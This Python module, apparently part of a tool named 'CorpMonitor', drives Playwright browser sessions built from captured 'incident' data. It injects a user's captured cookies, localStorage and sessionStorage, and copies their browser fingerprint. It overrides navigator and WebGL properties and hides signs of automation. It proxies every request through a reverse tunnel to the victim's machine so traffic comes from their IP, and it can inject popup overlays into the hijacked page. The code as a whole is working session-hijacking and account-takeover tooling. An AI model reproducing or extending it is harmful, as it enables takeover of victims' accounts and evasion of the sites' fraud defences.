from playwright.async_api import async_playwright, Browser, BrowserContext, Page
from typing import Optional, Dict, List
import asyncio
import threading
from io import BytesIO
from PIL import Image
import json
from src.managers.tunnel_client import TunnelClient, TunnelResponse

class BrowserSession:
    def __init__(self, session_id: str, page: Page, browser: Browser, playwright, context: BrowserContext):
        self.session_id = session_id
        self.page = page
        self.browser = browser
        self.playwright = playwright
        self.context = context
        self.is_active = True

class BrowserManager:
    def __init__(self, supabase):
        self.supabase = supabase
        self.sessions: Dict[str, BrowserSession] = {}
        self.playwright_instance = None
        self._close_locks: Dict[str, asyncio.Lock] = {}  # Locks para evitar race condition
        
        # ✅ NOVO: Cache de recursos para performance
        from src.managers.resource_cache import ResourceCache
        self.resource_cache = ResourceCache(max_size=100, ttl_seconds=3600)
        
        # ✅ NOVO: Cliente de túnel reverso
        self.tunnel_client: Optional[TunnelClient] = None
        
        # ✅ NOVO: Estatísticas de túnel
        self.tunnel_stats = {
            "requests": 0,
            "cached": 0,
            "tunneled": 0,
            "errors": 0,
            "total_time": 0.0
        }
    
    @staticmethod
    def escape_js_string(text: str) -> str:
        """Escapar string para uso seguro em JavaScript"""
        return json.dumps(text)[1:-1]  # Remove aspas do JSON
    
    async def initialize(self):
        """Inicializar Playwright"""
        if not self.playwright_instance:
            try:
                print("[BrowserManager] Inicializando Playwright...")
                self.playwright_instance = await async_playwright().start()
                print("[BrowserManager] ✓ Playwright inicializado com sucesso")
            except Exception as e:
                print(f"[BrowserManager] ❌ Erro ao inicializar Playwright: {e}")
                print("[BrowserManager] Execute: python -m playwright install chromium")
                raise
    
    @staticmethod
    def normalize_same_site(value: str) -> str:
        """
        Normalizar valor de sameSite para formato do Playwright.
        Chrome usa: no_restriction, unspecified, lax, strict, none
        Playwright espera: None, Lax, Strict
        """
        if not value or value.lower() in ["unspecified", "no_restriction"]:
            return "None"
        
        # Capitalizar primeira letra (lax -> Lax, strict -> Strict)
        normalized = value.capitalize()
        
        # Validar que está nos valores aceitos
        if normalized not in ["Strict", "Lax", "None"]:
            return "Lax"  # Valor padrão seguro
        
        return normalized
    
    async def _setup_tunnel_reverse(self, context, machine_id: str, incident_id: str):
        """
        Configurar túnel reverso para usar IP do cliente
        """
        
        print(f"[BrowserManager] 🌐 Configurando túnel reverso...")
        print(f"[BrowserManager] Machine ID: {machine_id}")
        print(f"[BrowserManager] Incident ID: {incident_id}")
        
        if not self.tunnel_client:
            self.tunnel_client = TunnelClient(self.supabase, machine_id)
        
        async def tunnel_route_handler(route):
            """Route handler via túnel reverso"""
            import time as time_module
            request = route.request
            url = request.url
            request_start = time_module.time()
            
            # Ignorar internos
            if url.startswith('data:') or url.startswith('blob:'):
                await route.continue_()
                return
            
            self.tunnel_stats["requests"] += 1
            
            # Verificar cache
            cached = self.resource_cache.get(url)
            if cached:
                content, status, headers = cached
                self.tunnel_stats["cached"] += 1
                elapsed = (time_module.time() - request_start) * 1000
                print(f"[BrowserManager] ⚡ Cache: {url[:60]}... ({elapsed:.0f}ms)")
                
                await route.fulfill(status=status, headers=headers, body=content)
                return
            
            print(f"[BrowserManager] 🌐 TÚNEL: {url[:80]}...")
            
            try:
                # Headers
                request_headers = {
                    'User-Agent': request.headers.get('user-agent', ''),
                    'Accept': request.headers.get('accept', '*/*'),
                    'Accept-Language': request.headers.get('accept-language', 'en-US,en;q=0.9'),
                    'Referer': request.headers.get('referer', ''),
                }
                
                # Fazer requisição via túnel
                tunnel_response: TunnelResponse = await self.tunnel_client.fetch(
                    url=url,
                    method=request.method,
                    headers=request_headers,
                    timeout=60,
                    incident_id=incident_id
                )
                
                if not tunnel_response.success:
                    raise Exception(f"Túnel falhou: {tunnel_response.error}")
                
                elapsed = (time_module.time() - request_start) * 1000
                self.tunnel_stats["tunneled"] += 1
                self.tunnel_stats["total_time"] += elapsed
                
                print(f"[BrowserManager] ✅ OK: {tunnel_response.status_code} ({elapsed:.0f}ms)")
                
                content = tunnel_response.bytes
                
                headers = {}
                for key, value in tunnel_response.headers.items():
                    if key.lower() not in ['content-encoding', 'transfer-encoding', 'content-length']:
                        headers[key] = value
                
                # Cache
                self.resource_cache.set(url, content, tunnel_response.status_code, headers)
                
                # Sincronizar cookies
                if tunnel_response.cookies and len(tunnel_response.cookies) > 0:
                    print(f"[BrowserManager] 🍪 Sincronizando {len(tunnel_response.cookies)} cookies...")
                    
                    try:
                        playwright_cookies = []
                        for c in tunnel_response.cookies:
                            cookie = {
                                "name": c.get("name", ""),
                                "value": c.get("value", ""),
                                "domain": c.get("domain", ""),
                                "path": c.get("path", "/"),
                                "httpOnly": c.get("httpOnly", False),
                                "secure": c.get("secure", False),
                                "sameSite": "Lax"
                            }
                            
                            if not c.get("isSession") and c.get("expirationDate"):
                                cookie["expires"] = c["expirationDate"]
                            
                            playwright_cookies.append(cookie)
                        
                        await context.add_cookies(playwright_cookies)
                        print(f"[BrowserManager] ✅ Cookies sincronizados")
                        
                    except Exception as cookie_error:
                        print(f"[BrowserManager] ⚠️ Erro ao sincronizar: {cookie_error}")
                
                await route.fulfill(status=tunnel_response.status_code, headers=headers, body=content)
                
            except Exception as e:
                self.tunnel_stats["errors"] += 1
                print(f"[BrowserManager] ❌ Erro no túnel: {e}")
                
                try:
                    await route.continue_()
                except:
                    await route.abort()
        
        await context.route("**/*", tunnel_route_handler)
        print(f"[BrowserManager] ✅ Túnel reverso ativo - IP do cliente")
    
    async def start_session(self, incident: Dict, interactive: bool = False) -> tuple[Optional[str], Optional[bytes]]:
        """
        Iniciar nova sessão do browser com os dados do incidente.
        Se interactive=True, abre browser visível para navegação manual.
        Retorna tuple (session_id, screenshot_bytes) ou (None, None) em caso de erro.
        """
        import time
        start_time = time.time()
        
        try:
            await self.initialize()
            
            # Extrair dados do incidente
            incident_id = incident.get("id")
            machine_id = incident.get("machine_id")
            target_url = incident.get("tab_url")
            cookies_raw = incident.get("full_cookie_data", [])
            fingerprint = incident.get("browser_fingerprint") or {}
            
            # ✅ CORREÇÃO #10: Buscar client_ip com fallback para múltiplos campos
            client_ip = (
                incident.get("client_ip") or 
                incident.get("public_ip") or 
                incident.get("ip_address")
            )
            
            if not client_ip:
                print(f"[BrowserManager] ❌ AVISO: IP público não disponível!")
                print(f"[BrowserManager] ⚠️ Túnel DNS será desabilitado - requisições virão do IP do servidor")
                print(f"[BrowserManager] ℹ️  Campos disponíveis no incident: {list(incident.keys())}")
            
            print(f"[BrowserManager] Iniciando sessão para incidente {incident_id}")
            print(f"[BrowserManager] URL: {target_url}")
            print(f"[BrowserManager] Cookies: {len(cookies_raw)} cookies")
            print(f"[BrowserManager] Fingerprint disponível: {bool(fingerprint)}")
            print(f"[BrowserManager] Client IP: {client_ip or 'Não disponível'}")
            
            # Iniciar browser Chromium (sempre novo processo se interativo)
            if interactive:
                print(f"[BrowserManager] Lançando novo browser Chromium (interativo)...")
                browser = await self.playwright_instance.chromium.launch(
                    headless=False,
                    args=[
                        '--start-maximized',
                        '--disable-blink-features=AutomationControlled'
                    ]
                )
                print(f"[BrowserManager] ✓ Browser iniciado")
            else:
                browser = await self.playwright_instance.chromium.launch(
                    headless=True,
                    args=[
                        '--disable-blink-features=AutomationControlled',
                        '--disable-web-security',
                        '--disable-features=IsolateOrigins,site-per-process'
                    ]
                )
            
            print(f"[BrowserManager] ✓ Browser inicializado")
            
            # Configurar contexto com fingerprint completo
            context_options = {
                'ignore_https_errors': True,
                'java_script_enabled': True
            }
            
            # Aplicar Screen Properties do fingerprint
            if fingerprint and fingerprint.get('screen'):
                screen = fingerprint['screen']
                context_options['viewport'] = {
                    'width': screen.get('width', 1920),
                    'height': screen.get('height', 1080)
                }
                context_options['device_scale_factor'] = screen.get('pixelRatio', 1)
                print(f"[BrowserManager] ✓ Viewport: {screen.get('width')}x{screen.get('height')} @ {screen.get('pixelRatio')}x")
            else:
                context_options['viewport'] = {'width': 1280, 'height': 720}
                print(f"[BrowserManager] ⚠️ Usando viewport padrão (1280x720)")
            
            # Aplicar User Agent
            if fingerprint and fingerprint.get('userAgent'):
                context_options['user_agent'] = fingerprint['userAgent']
                print(f"[BrowserManager] ✓ User Agent: {fingerprint['userAgent'][:60]}...")
            else:
                context_options['user_agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                print(f"[BrowserManager] ⚠️ Usando User Agent padrão")
            
            # Aplicar Timezone
            if fingerprint and fingerprint.get('timezone'):
                tz_name = fingerprint['timezone'].get('name', 'America/Sao_Paulo')
                context_options['timezone_id'] = tz_name
                langs = fingerprint.get('languages', {})
                context_options['locale'] = langs.get('language', 'pt-BR')
                print(f"[BrowserManager] ✓ Timezone: {tz_name}, Locale: {context_options['locale']}")
            
            # Criar contexto com todas as configurações
            context = await browser.new_context(**context_options)
            print(f"[BrowserManager] ✓ Contexto criado com fingerprint")
            
            # Injetar scripts para sobrescrever propriedades não-padrão
            if fingerprint and isinstance(fingerprint, dict):
                await self._inject_fingerprint_overrides(context, fingerprint)
            
            # ✅ CORREÇÃO #5: Injetar cookies com validação completa
            if cookies_raw:
                cookies = []
                for c in cookies_raw:
                    # Validar domínio
                    domain = c.get("domain", "")
                    if not domain or domain == "":
                        try:
                            from urllib.parse import urlparse
                            parsed = urlparse(target_url)
                            domain = parsed.hostname or "localhost"
                            print(f"[BrowserManager] Cookie '{c.get('name')}': domínio vazio corrigido para {domain}")
                        except:
                            domain = "localhost"
                    
                    # Normalizar sameSite considerando secure
                    raw_same_site = c.get("sameSite", "Lax")
                    is_secure = c.get("secure", False)
                    
                    if raw_same_site.lower() == "no_restriction":
                        normalized_same_site = "None" if is_secure else "Lax"
                    elif raw_same_site.lower() in ["unspecified", ""]:
                        normalized_same_site = "Lax"
                    else:
                        normalized_same_site = raw_same_site.capitalize()
                        if normalized_same_site not in ["Strict", "Lax", "None"]:
                            normalized_same_site = "Lax"
                    
                    # Validar None + Secure (sameSite=None requer secure=true)
                    if normalized_same_site == "None" and not is_secure:
                        print(f"[BrowserManager] Cookie '{c.get('name')}': sameSite=None mas secure=false, usando Lax")
                        normalized_same_site = "Lax"
                    
                    if raw_same_site != normalized_same_site:
                        print(f"[BrowserManager] Cookie '{c.get('name')}': sameSite normalizado de '{raw_same_site}' para '{normalized_same_site}'")
                    
                    cookie = {
                        "name": c.get("name", ""),
                        "value": c.get("value", ""),
                        "domain": domain,
                        "path": c.get("path", "/"),
                        "httpOnly": c.get("httpOnly", False),
                        "secure": is_secure,
                        "sameSite": normalized_same_site
                    }
                    
                    # ✅ CRÍTICO: Adicionar expires APENAS se não for cookie de sessão
                    is_session = c.get("isSession", False)
                    expiration = c.get("expirationDate")
                    
                    if not is_session and expiration and expiration > 0:
                        cookie["expires"] = expiration
                        print(f"[BrowserManager] Cookie '{c.get('name')}': persistente (expires: {expiration})")
                    else:
                        print(f"[BrowserManager] Cookie '{c.get('name')}': sessão (sem expires)")
                    
                    cookies.append(cookie)
                
                print(f"[BrowserManager] Injetando {len(cookies)} cookies...")
                try:
                    await context.add_cookies(cookies)
                    print(f"[BrowserManager] ✓ {len(cookies)} cookies injetados com sucesso")
                except Exception as cookie_error:
                    print(f"[BrowserManager] ❌ Erro ao injetar cookies: {cookie_error}")
                    import traceback
                    traceback.print_exc()
                    # Tentar injetar um por um para identificar qual falhou
                    for cookie in cookies:
                        try:
                            await context.add_cookies([cookie])
                            print(f"[BrowserManager] ✓ Cookie '{cookie['name']}' injetado")
                        except Exception as e:
                            print(f"[BrowserManager] ❌ Cookie '{cookie['name']}' falhou: {e}")
            
            # Aplicar bloqueios de domínios
            print(f"[BrowserManager] Aplicando bloqueios de domínio...")
            await self._apply_domain_blocks(context)
            
            # ✅ USAR TÚNEL REVERSO (IP do cliente via Chrome Extension)
            machine_id_from_incident = incident.get("machine_id")
            if machine_id_from_incident and incident_id:
                await self._setup_tunnel_reverse(context, machine_id_from_incident, incident_id)
            else:
                print(f"[BrowserManager] ⚠️ Sem túnel reverso!")
                print(f"[BrowserManager] ⚠️ Requisições virão do IP do SERVIDOR!")
            
            # ✅ AGORA criar página (túnel já está ativo)
            page = await context.new_page()
            
            # Navegar para URL
            print(f"[BrowserManager] Navegando para {target_url}...")
            await page.goto(target_url, wait_until='domcontentloaded', timeout=60000)
            print(f"[BrowserManager] ✓ Página carregada")
            
            # Aguardar carregamento adicional
            await page.wait_for_timeout(2000)
            
            # ✅ CORREÇÃO #6: Injetar localStorage e sessionStorage
            local_storage = incident.get("local_storage", {})
            session_storage = incident.get("session_storage", {})

            if local_storage or session_storage:
                print(f"[BrowserManager] Injetando storage...")
                
                import json
                
                try:
                    await page.evaluate(f"""
                        // Limpar storage existente
                        localStorage.clear();
                        sessionStorage.clear();
                        
                        // Injetar localStorage
                        const localData = {json.dumps(local_storage)};
                        for (const [key, value] of Object.entries(localData)) {{
                            try {{
                                localStorage.setItem(key, value);
                            }} catch (e) {{
                                console.warn('[CorpMonitor] Failed to set localStorage:', key, e);
                            }}
                        }}
                        
                        // Injetar sessionStorage
                        const sessionData = {json.dumps(session_storage)};
                        for (const [key, value] of Object.entries(sessionData)) {{
                            try {{
                                sessionStorage.setItem(key, value);
                            }} catch (e) {{
                                console.warn('[CorpMonitor] Failed to set sessionStorage:', key, e);
                            }}
                        }}
                        
                        console.log('[CorpMonitor] ✓ Storage injetado:', {{
                            localStorage: Object.keys(localStorage).length,
                            sessionStorage: Object.keys(sessionStorage).length
                        }});
                    """)
                    
                    print(f"[BrowserManager] ✓ localStorage ({len(local_storage)} keys) e sessionStorage ({len(session_storage)} keys) injetados")
                except Exception as storage_error:
                    print(f"[BrowserManager] ⚠️ Erro ao injetar storage: {storage_error}")
            
            # Capturar screenshot (apenas em modo headless)
            screenshot_bytes = None
            if not interactive:
                print(f"[BrowserManager] Capturando screenshot...")
                screenshot_bytes = await page.screenshot(full_page=False, type='png')
                print(f"[BrowserManager] ✓ Screenshot capturado ({len(screenshot_bytes)} bytes)")
            else:
                print(f"[BrowserManager] Modo interativo: navegador permanece aberto para navegação manual")
            
            # Criar sessão
            session_id = f"session-{incident_id}"
            session = BrowserSession(session_id, page, browser, self.playwright_instance, context)
            self.sessions[session_id] = session
            
            elapsed = time.time() - start_time
            mode_msg = "disponível para interação" if interactive else f"criada com sucesso em {elapsed:.2f}s"
            print(f"[BrowserManager] ✓ Sessão {session_id} {mode_msg}")
            
            # ✅ NOVO: Log de estatísticas de túnel
            if self.tunnel_stats["requests"] > 0:
                cache_stats = self.resource_cache.get_stats()
                avg_time = self.tunnel_stats["total_time"] / self.tunnel_stats["tunneled"] if self.tunnel_stats["tunneled"] > 0 else 0
                print(f"[BrowserManager] 📊 Túnel: {self.tunnel_stats['requests']} reqs, "
                      f"{self.tunnel_stats['cached']} cache hits ({cache_stats['hit_rate']}), "
                      f"{self.tunnel_stats['tunneled']} tunelados (avg {avg_time:.0f}ms), "
                      f"{self.tunnel_stats['errors']} erros")
            
            return session_id, screenshot_bytes
            
        except Exception as e:
            print(f"[BrowserManager] ❌ Erro ao iniciar sessão: {e}")
            import traceback
            traceback.print_exc()
            return None, None
    
    async def open_interactive_browser(self, incident: Dict) -> Optional[str]:
        """
        Abrir navegador interativo (visível) para o usuário navegar manualmente.
        Retorna session_id ou None se falhar.
        """
        try:
            session_id, _ = await self.start_session(incident, interactive=True)
            
            if session_id:
                print(f"[BrowserManager] ✓ Navegador interativo aberto (sessão: {session_id})")
                print(f"[BrowserManager] ℹ️  Feche a janela de controle para encerrar a sessão")
            
            return session_id
        except Exception as e:
            print(f"[BrowserManager] ❌ Erro ao abrir navegador interativo: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    async def _inject_fingerprint_overrides(self, context: BrowserContext, fingerprint: Dict):
        """Injetar scripts para sobrescrever propriedades do navigator/window"""
        try:
            # Extrair dados do fingerprint com segurança
            platform = fingerprint.get("platform", "Win32")
            vendor = fingerprint.get("vendor", "Google Inc.")
            hardware = fingerprint.get("hardware", {})
            screen = fingerprint.get("screen", {})
            webgl = fingerprint.get("webgl", {})
            
            # Construir script de override
            script = f"""
            // Override navigator properties
            Object.defineProperty(navigator, 'platform', {{
                get: () => '{platform}'
            }});
            
            Object.defineProperty(navigator, 'vendor', {{
                get: () => '{vendor}'
            }});
            
            Object.defineProperty(navigator, 'hardwareConcurrency', {{
                get: () => {hardware.get("hardwareConcurrency", 8)}
            }});
            
            Object.defineProperty(navigator, 'deviceMemory', {{
                get: () => {hardware.get("deviceMemory", 8)}
            }});
            
            Object.defineProperty(navigator, 'maxTouchPoints', {{
                get: () => {hardware.get("maxTouchPoints", 0)}
            }});
            
            // Override screen properties
            Object.defineProperty(screen, 'colorDepth', {{
                get: () => {screen.get("colorDepth", 24)}
            }});
            
            Object.defineProperty(screen, 'pixelDepth', {{
                get: () => {screen.get("pixelDepth", 24)}
            }});
            """
            
            # Adicionar override de WebGL se disponível
            if webgl.get('vendor') and webgl.get('renderer'):
                vendor_escaped = webgl.get('vendor', '').replace("'", "\\'")
                renderer_escaped = webgl.get('renderer', '').replace("'", "\\'")
                
                script += f"""
            // Override WebGL properties
            const getParameter = WebGLRenderingContext.prototype.getParameter;
            WebGLRenderingContext.prototype.getParameter = function(param) {{
                if (param === 0x1F00) return '{vendor_escaped}';
                if (param === 0x1F01) return '{renderer_escaped}';
                if (param === 0x9245) {{
                    const ext = this.getExtension('WEBGL_debug_renderer_info');
                    if (ext && param === ext.UNMASKED_VENDOR_WEBGL) return '{vendor_escaped}';
                }}
                if (param === 0x9246) {{
                    const ext = this.getExtension('WEBGL_debug_renderer_info');
                    if (ext && param === ext.UNMASKED_RENDERER_WEBGL) return '{renderer_escaped}';
                }}
                return getParameter.apply(this, arguments);
            }};
            
            // Aplicar também para WebGL2
            if (typeof WebGL2RenderingContext !== 'undefined') {{
                const getParameter2 = WebGL2RenderingContext.prototype.getParameter;
                WebGL2RenderingContext.prototype.getParameter = function(param) {{
                    if (param === 0x1F00) return '{vendor_escaped}';
                    if (param === 0x1F01) return '{renderer_escaped}';
                    return getParameter2.apply(this, arguments);
                }};
            }}
            """
            
            # Remover sinais de automação
            script += """
            // Remove sinais de automação
            delete navigator.webdriver;
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined
            });
            
            // Sobrescrever chrome.runtime
            if (window.chrome && window.chrome.runtime) {
                Object.defineProperty(window.chrome, 'runtime', {
                    get: () => undefined
                });
            }
            
            console.log('[CorpMonitor] ✓ Fingerprint overrides aplicados');
            """
            
            await context.add_init_script(script)
            print(f"[BrowserManager] ✓ Fingerprint overrides injetados")
            
        except Exception as e:
            print(f"[BrowserManager] ⚠️ Erro ao injetar fingerprint overrides: {e}")
            import traceback
            traceback.print_exc()
    
    async def _apply_domain_blocks(self, context: BrowserContext):
        """Aplicar bloqueios de domínios ativos"""
        try:
            response = self.supabase.table("blocked_domains")\
                .select("domain")\
                .eq("is_active", True)\
                .execute()
            
            if response.data:
                blocked_domains = [d["domain"] for d in response.data]
                print(f"[BrowserManager] Bloqueando {len(blocked_domains)} domínios")
                
                async def handle_route(route):
                    url = route.request.url
                    if any(bd in url for bd in blocked_domains):
                        print(f"[BrowserManager] ❌ Bloqueado: {url}")
                        await route.abort()
                    else:
                        await route.continue_()
                
                await context.route("**/*", handle_route)
        except Exception as e:
            print(f"[BrowserManager] Erro ao aplicar bloqueios: {e}")
    
    async def navigate(self, session_id: str, url: str) -> Optional[bytes]:
        """Navegar para nova URL"""
        try:
            session = self.sessions.get(session_id)
            if not session or not session.is_active:
                print(f"[BrowserManager] Sessão {session_id} não encontrada")
                return None
            
            print(f"[BrowserManager] Navegando para {url}")
            await session.page.goto(url, wait_until='domcontentloaded', timeout=30000)
            await session.page.wait_for_timeout(1000)
            
            screenshot_bytes = await session.page.screenshot(full_page=False)
            return screenshot_bytes
        except Exception as e:
            print(f"[BrowserManager] Erro ao navegar: {e}")
            return None
    
    async def click(self, session_id: str, selector: str) -> Optional[bytes]:
        """Clicar em elemento"""
        try:
            session = self.sessions.get(session_id)
            if not session or not session.is_active:
                return None
            
            await session.page.click(selector)
            await session.page.wait_for_timeout(1000)
            
            screenshot_bytes = await session.page.screenshot(full_page=False)
            return screenshot_bytes
        except Exception as e:
            print(f"[BrowserManager] Erro ao clicar: {e}")
            return None
    
    async def get_screenshot(self, session_id: str) -> Optional[bytes]:
        """Capturar screenshot atual"""
        try:
            session = self.sessions.get(session_id)
            if not session or not session.is_active:
                return None
            
            # Verificar se página ainda está aberta
            if session.page.is_closed():
                print(f"[BrowserManager] Página da sessão {session_id} já está fechada")
                return None
            
            screenshot_bytes = await session.page.screenshot(full_page=False)
            return screenshot_bytes
        except Exception as e:
            print(f"[BrowserManager] Erro ao capturar screenshot: {e}")
            return None
    
    async def inject_popup(self, session_id: str, template_id: str) -> bool:
        """Injetar popup customizado na página"""
        try:
            session = self.sessions.get(session_id)
            if not session or not session.is_active:
                return False
            
            # Buscar template do Supabase
            template_response = self.supabase.table("popup_templates")\
                .select("*")\
                .eq("id", template_id)\
                .single()\
                .execute()
            
            if not template_response.data:
                print("[BrowserManager] Template não encontrado")
                return False
            
            template = template_response.data
            html_content = template.get("html_content", "")
            css_styles = template.get("css_styles", "")
            
            # Escapar conteúdo para prevenir XSS
            html_escaped = self.escape_js_string(html_content)
            css_escaped = self.escape_js_string(css_styles)
            
            # Injetar popup via JavaScript
            js_code = f"""
            (function() {{
                const overlay = document.createElement('div');
                overlay.id = 'corpmonitor-popup-overlay';
                overlay.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 999999; display: flex; align-items: center; justify-content: center;';
                
                const popup = document.createElement('div');
                popup.id = 'corpmonitor-popup';
                popup.innerHTML = "{html_escaped}";
                
                const style = document.createElement('style');
                style.textContent = "{css_escaped}";
                
                overlay.appendChild(popup);
                document.body.appendChild(style);
                document.body.appendChild(overlay);
                
                console.log('[CorpMonitor] Popup injetado');
            }})();
            """
            
            await session.page.evaluate(js_code)
            print(f"[BrowserManager] Popup {template_id} injetado com sucesso")
            
            return True
        except Exception as e:
            print(f"[BrowserManager] Erro ao injetar popup: {e}")
            return False
    
    async def test_tunnel_connection(self, machine_id: str) -> bool:
        """
        Testar túnel reverso
        """
        try:
            print(f"[BrowserManager] 🧪 Testando túnel...")
            
            tunnel = TunnelClient(self.supabase, machine_id)
            response = await tunnel.get("https://httpbin.org/get", timeout=10)
            
            if response.success:
                print(f"[BrowserManager] ✅ Túnel OK")
                print(f"[BrowserManager]    Status: {response.status_code}")
                print(f"[BrowserManager]    Latência: {response.elapsed_ms}ms")
                return True
            else:
                print(f"[BrowserManager] ❌ Túnel FALHOU: {response.error}")
                return False
                
        except Exception as e:
            print(f"[BrowserManager] ❌ Erro: {e}")
            return False
    
    async def close_session(self, session_id: str):
        """Fechar uma sessão específica com timeout e cleanup de processos"""
        if session_id not in self.sessions:
            print(f"[BrowserManager] Sessão {session_id} não encontrada")
            return
        
        session = self.sessions[session_id]
        
        try:
            # Timeout geral de 5 segundos
            async with asyncio.timeout(5):
                # Fechar página (timeout 2s)
                if session.page and not session.page.is_closed():
                    try:
                        async with asyncio.timeout(2):
                            await session.page.close()
                            print(f"[BrowserManager] ✓ Página da sessão {session_id} fechada")
                    except asyncio.TimeoutError:
                        print(f"[BrowserManager] ⚠️ Timeout ao fechar página")
                    except Exception as e:
                        if "closed" not in str(e).lower():
                            print(f"[BrowserManager] Aviso ao fechar página: {e}")
                
                # Fechar contexto (timeout 2s)
                if session.context:
                    try:
                        async with asyncio.timeout(2):
                            await session.context.close()
                            print(f"[BrowserManager] ✓ Contexto da sessão {session_id} fechado")
                    except asyncio.TimeoutError:
                        print(f"[BrowserManager] ⚠️ Timeout ao fechar contexto")
                    except Exception as e:
                        if "closed" not in str(e).lower():
                            print(f"[BrowserManager] Aviso ao fechar contexto: {e}")
                
                # Fechar browser (timeout 2s)
                if session.browser:
                    try:
                        async with asyncio.timeout(2):
                            await session.browser.close()
                            print(f"[BrowserManager] ✓ Browser da sessão {session_id} encerrado")
                    except asyncio.TimeoutError:
                        print(f"[BrowserManager] ⚠️ Timeout ao fechar browser - matando processos")
                        # Matar processos Chromium se timeout
                        try:
                            import psutil
                            import os
                            current_pid = os.getpid()
                            
                            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                                try:
                                    if proc.info['name'] and 'chrome' in proc.info['name'].lower():
                                        cmdline = proc.info.get('cmdline', [])
                                        if cmdline and any('playwright' in str(arg).lower() for arg in cmdline):
                                            if proc.pid != current_pid:
                                                proc.kill()
                                                print(f"[BrowserManager] ✓ Processo {proc.pid} eliminado")
                                except (psutil.NoSuchProcess, psutil.AccessDenied):
                                    pass
                        except ImportError:
                            print(f"[BrowserManager] ⚠️ psutil não instalado")
                        except Exception as e:
                            print(f"[BrowserManager] Erro ao matar processos: {e}")
                    except Exception as e:
                        if "closed" not in str(e).lower():
                            print(f"[BrowserManager] Aviso ao fechar browser: {e}")
        
        except asyncio.TimeoutError:
            print(f"[BrowserManager] ⚠️ Timeout geral ao fechar sessão {session_id}")
            
            # Reiniciar Playwright após timeout (estado corrompido)
            try:
                print(f"[BrowserManager] ⚠️ Reiniciando Playwright após timeout...")
                if self.playwright_instance:
                    try:
                        await self.playwright_instance.stop()
                    except:
                        pass
                    self.playwright_instance = None
                print(f"[BrowserManager] ✓ Playwright reiniciado para próxima sessão")
            except Exception as reinit_error:
                print(f"[BrowserManager] Erro ao reiniciar Playwright: {reinit_error}")
        
        except Exception as e:
            print(f"[BrowserManager] Erro ao fechar sessão {session_id}: {e}")
        finally:
            # SEMPRE remover do mapa (mesmo com erro/timeout)
            try:
                session.is_active = False
                if session_id in self.sessions:
                    del self.sessions[session_id]
                    print(f"[BrowserManager] ✓ Sessão {session_id} removida do mapa")
            except Exception as e:
                print(f"[BrowserManager] Erro ao limpar sessão: {e}")
    
    async def get_active_tab_id_for_domain(self, machine_id: str, domain: str):
        """Buscar tab_id ativo mais recente para um domínio"""
        try:
            response = self.supabase.table('active_sessions')\
                .select('tab_id')\
                .eq('machine_id', machine_id)\
                .eq('domain', domain)\
                .eq('is_active', True)\
                .order('last_activity', desc=True)\
                .limit(1)\
                .execute()
            
            if response.data and len(response.data) > 0:
                return response.data[0]['tab_id']
            return None
        except Exception as e:
            print(f"[BrowserManager] Erro ao buscar tab_id ativo: {e}")
            return None
    
    async def close_all_sessions(self):
        """Fechar todas as sessões ativas"""
        session_ids = list(self.sessions.keys())
        for session_id in session_ids:
            try:
                await self.close_session(session_id)
            except Exception as e:
                print(f"[BrowserManager] Erro ao fechar sessão {session_id}: {e}")
        
        # Encerrar Playwright ao final
        if self.playwright_instance:
            try:
                await self.playwright_instance.stop()
                print(f"[BrowserManager] ✓ Playwright encerrado")
            except:
                pass
            self.playwright_instance = None
